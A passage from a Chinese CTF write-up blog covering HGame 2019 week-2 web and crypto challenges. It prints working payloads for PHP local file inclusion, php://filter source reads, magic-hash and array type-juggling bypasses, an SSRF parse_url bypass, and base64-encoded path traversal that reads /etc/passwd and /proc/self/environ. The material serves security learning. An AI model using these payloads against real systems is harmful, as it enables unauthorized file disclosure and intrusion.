class="line">    e = <span class="number">12</span></span><br><span class="line">    c = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line"></span><br><span class="line">    plaintext = invalidExponent(p,q,e,c)</span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="basicmath"><a href="#basicmath" class="headerlink" title="basicmath"></a>basicmath</h2><blockquote><p>Description<br>hint: 二次剩余的求解<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/0b206d5e4fc12dab4961cc5376fbc856f64331976359d30ff1c11668de11a6f0/Crypto2.py">http://plir4axuz.bkt.clouddn.com/hgame2019/0b206d5e4fc12dab4961cc5376fbc856f64331976359d30ff1c11668de11a6f0/Crypto2.py</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;神奇的MD5&quot;&gt;&lt;a href=&quot;#神奇的MD5&quot; class=&quot;headerlink&quot; title=&quot;神奇的MD5&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
    <category term="RCE" scheme="v0w.top/tags/RCE/"/>
    
    <category term="XSS" scheme="v0w.top/tags/XSS/"/>
    
    <category term="文件上传" scheme="v0w.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame2019-week2-WP</title>
    <link href="v0w.top/2019/02/10/Hgame2019-week2WP/"/>
    <id>v0w.top/2019/02/10/Hgame2019-week2WP/</id>
    <published>2019-02-09T16:00:00.000Z</published>
    <updated>2020-07-18T10:45:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><blockquote><p>描述<br>代码审计♂第二弹<br>URL <a href="http://118.24.25.25:9999/easyphp/index.html">http://118.24.25.25:9999/easyphp/index.html</a></p></blockquote><p><code>robots.txt</code>得到<code>img/index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    $img = str_replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>本地文件包含，双写绕过过滤就行</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.25.25:9999&#x2F;easyphp&#x2F;img&#x2F;index.php?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;...&#x2F;.&#x2F;flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAKICAgIC8vJGZsYWcgPSAnaGdhbWV7WW91XzRyZV9Tb19nMG9kfSc7CiAgICBlY2hvICJtYXliZV95b3Vfc2hvdWxkX3RoaW5rX3RoaW5rIjsK </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="comment">//$flag = &#x27;hgame&#123;You_4re_So_g0od&#125;&#x27;;     echo &quot;maybe_you_should_think_think&quot;; </span></span><br></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></figure><h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><blockquote><p>描述<br>some php tricks<br>URL <a href="http://118.24.3.214:3001/">http://118.24.3.214:3001</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (<span class="keyword">string</span>)@$_GET[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">$str2 = (<span class="keyword">string</span>)@$_GET[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">&#x27;str3&#x27;</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">&#x27;str4&#x27;</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">&#x27;H_game&#x27;</span>];</span><br><span class="line">$url = @$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 1 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 2 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 3 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 4 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;H_game&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 5 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 6 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 7 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 8 fial&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 11 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几个简单的php trick</p><ol><li>md5+ php弱类型</li><li>md5不处理数组</li><li>php在接受数据时会自动把’+‘和’.‘替换为’_’</li><li>php中数字总是比数组小</li></ol><p>之后发现像是一个SSRF, 结合访问<code>admin.php</code>得到的提示：<code>only localhost can see it</code>，而可以推测，这里是通过SSRF来读文件。</p><p>但是代码中有一小段对url做了过滤，需要绕过一下, 参考<a href="https://www.jianshu.com/p/b31b7b1ca3cb">https://www.jianshu.com/p/b31b7b1ca3cb</a></p><p>原理：主要利用<code>parse_url</code>将最后一个有效的<code>@host</code>作为host。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">&quot;www.baidu.com&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 9 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">&quot;http&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 10 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001&#x2F;?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;123&amp;str4[]&#x3D;456&amp;H+game[]&#x3D;&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php</span><br></pre></td></tr></table></figure><p>之后，得到<code>admin.php</code>的内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;only localhost can see it&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>]??<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sorry,you can&#x27;t see it&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不允许文件名为存在的文件名，笔者采用php伪协议文件流绕过：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>也可以通过<code>xxxdir/../flag.php</code>方式绕过</p><p>最终payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001&#x2F;?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;123&amp;str4[]&#x3D;456&amp;H+game[]&#x3D;&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgJGZsYWcgPSBoZ2FtZXtUaEVyNF9BcjRfczBtNF9QaHBfVHIxY2tzfSA&#x2F;Pgo&#x3D;</span><br><span class="line">&lt;?php $flag &#x3D; hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt; </span><br></pre></td></tr></table></figure><h2 id="PHP-Is-The-Best-Language"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</h2><blockquote><p>描述<br>var_dump了解一下<br>URL <a href="http://118.25.89.91:8888/flag.php">http://118.25.89.91:8888/flag.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;secret.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $flag; </span></span><br><span class="line"><span class="comment">#echo $secret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">&#x27;gate&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;key&#x27;</span>])) &#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;door&#x27;</span>]))&#123; </span><br><span class="line">    $secret = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;door&#x27;</span>], $secret); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$gate = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;key&#x27;</span>], $secret); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">&#x27;gate&#x27;</span>]) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker GetOut!!&quot;</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">&#x27;key&#x27;</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">&#x27;key&#x27;</span>])))+<span class="number">1</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Wow!!!&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker GetOut!!&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先，<code>secret</code>用了一个<code>hash_mac</code>函数，这个函数有问题的，查手册，容易发现：</p><p><img src="https://i.loli.net/2019/02/20/5c6d5a12e2977.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hash_hmac( string $algo, string $data, string $key[, bool $raw_output &#x3D; FALSE] )</span><br></pre></td></tr></table></figure><p>函数处理的<code>$data</code>参数是数组的时候，会出错返回<code>NULL</code>,于是我们可以利用这一点使<code>secret</code>可控。php弱类型<code>null==0</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(md5($_POST[&#39;key&#39;])+1) &#x3D;&#x3D; (md5(md5($_POST[&#39;key&#39;])))+1</span><br></pre></td></tr></table></figure><p>一种是通过<code>md5($_POST[&#39;key&#39;]) == (md5(md5($_POST[&#39;key&#39;])))</code></p><p>二种是因为<code>+1</code>的存在，找到两个值开头数字相同的就可以了。</p><p>我选择第一种，找到了这个<code> 7r4lGXCH2Ksu2JNT3BYM</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt;</span><br><span class="line">0e269ab12da27d79a6626d91f34ae849</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt;</span><br><span class="line">0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure><p>求gate：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php&gt; var_dump(hash_hmac(&#39;sha256&#39;,</span><br><span class="line">&#39;7r4lGXCH2Ksu2JNT3BYM&#39;, NULL))</span><br><span class="line">string(64)</span><br><span class="line">&quot;81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1</span><br><span class="line">36aa84fe6&quot;</span><br></pre></td></tr></table></figure><p>最终<strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gate&#x3D;81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f136aa84fe6&amp;key&#x3D;7r4lGXCH2Ksu2JNT3BYM&amp;door[]&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Spider"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</h2><blockquote><p>描述<br>Come to death in the ocean of mathematics together with Li4n0!<br>Answer 30 questions correctly in a row during 40 seconds(The calculation result is subject to python3),then you can get the flag. Enjoy it~<br>hint1:The most basic operation of a spider is to disguise itself.<br>hint2:Always believe only what you see with your own eyes<br>URL <a href="http://111.231.140.29:10000/">http://111.231.140.29:10000</a></p></blockquote><p><strong>1-10 关</strong></p><p>正常的爬虫，但是注意加上UA头。</p><p><strong>11-20 关</strong></p><p>使用了一个很骚的反爬虫机制，更换了css中的字体。</p><p>使得浏览器显示的数字与content中的数字不同。</p><p>将字体下载下来，找到一一对应关系，写一个替换规则就好了。</p><p><strong>21-30关</strong></p><p>使用after伪元素做了替换，这里直接抓取一下css中真实的算式就可以了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">token=&#123;</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;T0tI6mS6pFyAISBhgrM8BN1k0MOdNM88&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">list=<span class="string">&#x27;1026943587&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://111.231.140.29:10000/&#x27;</span></span><br><span class="line">url1=<span class="string">&#x27;http://111.231.140.29:10000/question&#x27;</span></span><br><span class="line">url2=<span class="string">&#x27;http://111.231.140.29:10000/solution&#x27;</span></span><br><span class="line">url3=<span class="string">&#x27;http://111.231.140.29:10000/statics/style.css&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&lt;span&gt;(.*?)=&#x27;</span></span><br><span class="line">r=requests.post(url=url,data=token)</span><br><span class="line">session=r.cookies</span><br><span class="line">print(<span class="string">&quot;[*] &quot;</span>+<span class="string">&quot;-&quot;</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    math = re.findall(res, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span>%i + math)</span><br><span class="line">    math = eval(math)</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: math</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url2,data=result,cookies=session,headers=header)</span><br><span class="line">    session = r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">    math = re.findall(res, r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> math:</span><br><span class="line">        <span class="keyword">if</span> ord(j) &gt; <span class="number">47</span>:</span><br><span class="line">            tmp += list[int(j)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += j</span><br><span class="line">    math = tmp</span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span> % i + math)</span><br><span class="line">    answer = (eval(math))</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: answer</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url2, data=result, cookies=session, headers=header)</span><br><span class="line">    session = r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;content:&quot;(.*?)=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">30</span>):</span><br><span class="line">    css = requests.get(url=url3, cookies=session, headers=header)</span><br><span class="line">    math = re.findall(res, css.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    math = str(math)[<span class="number">2</span>:len(math) - <span class="number">3</span>]</span><br><span class="line">    print(<span class="string">&#x27;[+] %d :&#x27;</span> % i + math)</span><br><span class="line">    answer = (eval(math))</span><br><span class="line">    result = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: answer</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url2, data=result, cookies=session, headers=header)</span><br><span class="line">    session=r.cookies</span><br><span class="line">    print(<span class="string">&quot;[*] &quot;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">        print(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 28 :3898465&#x2F;(242636442&#x2F;774712632&#x2F;627122699&#x2F;(524541058))</span><br><span class="line">[*] ----------------------------------------</span><br><span class="line">[+] 29 :(699759722&#x2F;65326526+789619879*78001637+875760928)</span><br><span class="line">[*] ----------------------------------------</span><br><span class="line">hgame&#123;88c240c943d3f724a0bb59ebe37a5a49da22e40c0a8b2e0e659131165ea18825&#125;</span><br></pre></td></tr></table></figure><h2 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h2><blockquote><p>描述<br>Math is interesting, isn’t it?<br>update: 题中最后的^是乘方，不是xor<br>hint: 了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了<br>hint2: 图片目录不在web目录下<br>URL <a href="http://test.tan90.me:8080/index.php">http://test.tan90.me:8080/index.php</a></p></blockquote><p>回答完<code>1+1=2</code>后，正式进入题目，看到一个很复杂的数学问题，本想瞎子啊下来直接搜索看答案，但是发现下载下来文件叫<code>cXVlc3Rpb24ucG5n.php</code>。怎么这么奇怪，为什么还是php，这里会想到是有点像<code>url重写技术</code></p><p>但是明眼人一下就看出来，这只是一段简单的<code>base64</code>，这也就造成了任意文件读取：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cXVlc3Rpb24ucG5nquestion.png</span><br><span class="line">Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA&#x3D;&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/22/5c6f55f0f18cf.png"></p><p>但是不知道flag的路径，试着读了一下，无果。于是找服务文件的路径和配置文件的路径：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environLi4vLi4vLi4vLi4vcHJvYy9zZWxmL2Vudmlyb24&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/22/5c6f5d632c82d.png"></p><p>之后呢，看看tomcat的配置<code> /usr/local/tomcat/conf/server.xml</code>发现出题人并没有修改默认的web路径，还是在<code>/usr/local/tomcat/webapps/ROOT</code></p><p><img src="https://i.loli.net/2019/02/22/5c6f5fe3a8db9.png"></p><p>接下来，看一下<code>ROOT/WEB-INF/web.xml</code></p><p><img src="https://i.loli.net/2019/02/22/5c6f6047b7575.png"></p><p>发现一个<code>mathyouqu的路由</code>：访问<code>mathyouqu-servlet.xml</code></p><p><img src="https://i.loli.net/2019/02/22/5c6f621dcded5.png"></p><p>但是只有包名<code>hgame.controller</code>没有具体的文件名。</p><p>回头试试看有没有报错之类的，因为其使用base64编解码，于是错误的BASE64可能会导致java类报错：</p><p><img src="https://i.loli.net/2019/02/22/5c6f63202f93d.png"></p><p>得到class文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;hgame&#x2F;controller&#x2F;MathController.class</span><br><span class="line"></span><br><span class="line">Li4vLi4vLi4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2hnYW1lL2NvbnRyb2xsZXIvTWF0aENvbnRyb2xsZXIuY2xhc3M&#x3D;</span><br></pre></td></tr></table></figure><p>用Jad反编译成java文件（<a href="https://varaneckas.com/jad/">Jad下载链接</a>）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\SecTools\Web渗透\JAD\jad158g.win</span><br><span class="line">λ jad -o -r -s java -d src math2.class</span><br><span class="line">Parsing math2.class... Generating src\hgame\controller\MathController.java</span><br></pre></td></tr></table></figure><p>直接看关键代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;This is the last question.&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;123852^x % 612799081 = 6181254136845 % 612799081&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;The flag is hgame&#123;x&#125;.x is a decimal number.&quot;</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;Flag is not here.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真的是一个数学问题，一个方程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123852^x % 612799081 &#x3D; 6181254136845 % 612799081</span><br></pre></td></tr></table></figure><p>爆破得解（但是比较耗时）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">res = pow(<span class="number">123852</span>,x,<span class="number">612799081</span>)</span><br><span class="line"><span class="keyword">if</span> res == <span class="number">6181254136845</span> % <span class="number">612799081</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;find: &quot;</span> + str(x)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">x+=<span class="number">1</span></span><br><span class="line"><span class="comment"># find: 15387368</span></span><br></pre></td></tr></table></figure><hr><p>因为是第一次做有关Java的题目，也是第一次接触Java反编译，很感谢出题人，下面给出几篇<strong>参考链接</strong>：</p><ol><li><a href="https://blog.csdn.net/qq_19714505/article/details/80309968">java的class文件批量反编译成java</a></li><li><a href="https://blog.csdn.net/sinat_26935081/article/details/51283706">Spring MVC工程结构及配置整理</a></li><li><a href="https://www.cnblogs.com/liuhongfeng/p/4177835.html">Windows下如何配置tomcat环境变量</a></li></ol><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="浪漫的足球圣地"><a href="#浪漫的足球圣地" class="headerlink" title="浪漫的足球圣地"></a>浪漫的足球圣地</h2><blockquote><p>描述<br>无<br>URL <a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt</a></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</span><br></pre></td></tr></table></figure><p>曼切斯特编码，改成二进制</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>参考<a 